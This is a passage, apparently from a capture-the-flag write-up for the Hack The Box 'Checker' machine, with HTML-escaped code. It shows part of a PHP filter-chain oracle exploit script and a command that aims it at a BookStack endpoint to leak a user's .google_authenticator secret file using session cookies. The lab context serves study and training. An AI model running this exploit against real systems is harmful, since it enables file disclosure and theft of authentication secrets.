class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e requ\n            \u003cspan class=\"hljs-keyword\"\u003eelif\u003c/span\u003e self.verb == Verb.PUT:\n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e self.json_input: \n                    requ = self.session.put(self.target, json=merged_data)\n                \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n                    requ = self.session.put(self.target, data=merged_data)\n                \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e requ\n            \u003cspan class=\"hljs-keyword\"\u003eelif\u003c/span\u003e self.verb == Verb.DELETE:\n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e self.json_input:\n                    requ = self.session.delete(self.target, json=merged_data)\n                \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n                    requ = self.session.delete(self.target, data=merged_data)\n                \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e requ\n            \u003cspan class=\"hljs-keyword\"\u003eelif\u003c/span\u003e self.verb == Verb.POST:\n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e self.json_input:\n                    requ = self.session.post(self.target, json=merged_data)\n                \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n                    requ = self.session.post(self.target, data=merged_data)\n                \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e requ\n        except requests.exceptions.ConnectionError :\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[-] Could not instantiate a connection\"\u003c/span\u003e)\n            \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e(1)\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e None\n\n    \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\n    Used to determine if the answer trigged the error based oracle\n    TODO : increase the efficiency of the time based oracle\n    \"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n    def error_oracle(self, s):\n        requ = self.req_with_response(s)\n\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e self.match:\n            \u003cspan class=\"hljs-comment\"\u003e# DEBUG print(\"PATT\", (self.match in requ.text))\u003c/span\u003e\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e self.match \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e requ.text \n\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e self.time_based_attack:\n            \u003cspan class=\"hljs-comment\"\u003e# DEBUG print(\"ELAP\", requ.elapsed.total_seconds() \u003e ((self.time_based_attack/2)+0.01))\u003c/span\u003e\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e requ.elapsed.total_seconds() \u003e ((self.time_based_attack/\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e)+\u003cspan class=\"hljs-number\"\u003e0.01\u003c/span\u003e)\n        \n        # DEBUG print(\"CODE\", requ.status_code == \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e)\n        return requ.status_code == \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epython filters_chain_oracle_exploit.py \\\n  --target \u003cspan class=\"hljs-string\"\u003e\"http://checker.htb/ajax/page/12/save-draft\"\u003c/span\u003e \\\n  --file \u003cspan class=\"hljs-string\"\u003e\"/backup/home_backup/home/reader/.google_authenticator\"\u003c/span\u003e \\\n  --parameter \u003cspan class=\"hljs-string\"\u003e\"html\"\u003c/span\u003e \\\n  --verb PUT \\\n  --headers \u003cspan class=\"hljs-string\"\u003e\"{\\\"X-CSRF-TOKEN\\\": \\\"W2b1WrEWyjBm6Trtww9aTPmoS9ZBqZejPACNmTT5\\\", \\\"Content-Type\\\": \\\"application/x-www-form-urlencoded\\\", \\\"Cookie\\\": \\\"jstree_select=1; XSRF-TOKEN=eyJpdiI6InRMa3VVTzZTa2EzWDVFRFQzaEFlSkE9PSIsInZhbHVlIjoiUFFvT2IxeDR2U3FKMndxenlmRmwwTWYyUlJNbXVscnRrUGFtZkdzM2hjKzlsU1U0ZjdOUkVRMkI2U1FKYmpqMFNDTnVHdVNFYzR1TXhDN1A5dFdlUHVBK05UZUhweWtyMHRKUVFHbVZUd05Lays5VklZS3JtbjByNWJqVEk0QTAiLCJtYWMiOiI1Y2Y5OWMwNGRkOTVlODQ4ZjI0YWYxNDBlMWM0MmM4MmE1YjdkYWI1YmY0NzUzMmVlNWRhZjI2MDZlYWI5ZWQwIiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6Ild0Um4wek9DVzlZYU55WEZpZUFqK0E9PSIsInZhbHVlIjoiQlFYMXZic1NQUXBtVG1IRXFvb1R3dkFsTTJyQW5meUZuUi9QbUd0Lzdtb2RXS2VGOUpFQUhHVXFmRGlBRW9iNG1SUEttTVlYZzF6NzJiVGxicFp5L09qVUdGQmp4UEFqaUFTZWt5VkZpS0I3UE1URHcrNkZML2FlUy9JQW82cXIiLCJtYWMiOiJiMTBmMWQzNzVjNTYwNDMyYWFlMTU1YzNlNTRmYzJhYjk0NTllMDUzODgxYTRjY2RhMmJmNz
